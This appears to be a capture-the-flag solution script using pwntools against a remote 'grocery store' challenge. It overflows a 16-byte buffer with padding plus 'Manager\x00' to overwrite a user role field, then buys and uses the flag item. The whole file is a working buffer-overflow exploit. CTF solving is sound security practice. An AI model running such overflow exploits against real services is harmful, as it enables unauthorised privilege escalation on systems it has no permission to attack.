import pwn

def refill_flag():
    # refill items
    io.sendline(b"3")
    # refill flag
    io.sendline(b"3")

def buy_flag():
    # buy item
    io.sendline(b"1")
    # buy flag
    io.sendline(b"3")

def use_flag():
    # use item
    io.sendline(b"2")
    # use first item in inventory, this is the flag
    io.sendline(b"0")

io = pwn.remote("challenges.sshuzl.de", 12379)
# io = pwn.process("./grocery_store")

### Exploit

# 16 bytes padding, then overwrite `user.role` field.
# Note that we manually null terminate the buffer
# since otherwise `fgets` would've read the newline.
io.sendline(b"A" * 16 + b"Manager\x00")

refill_flag()

buy_flag()

use_flag()

# leave connection open
io.interactive()
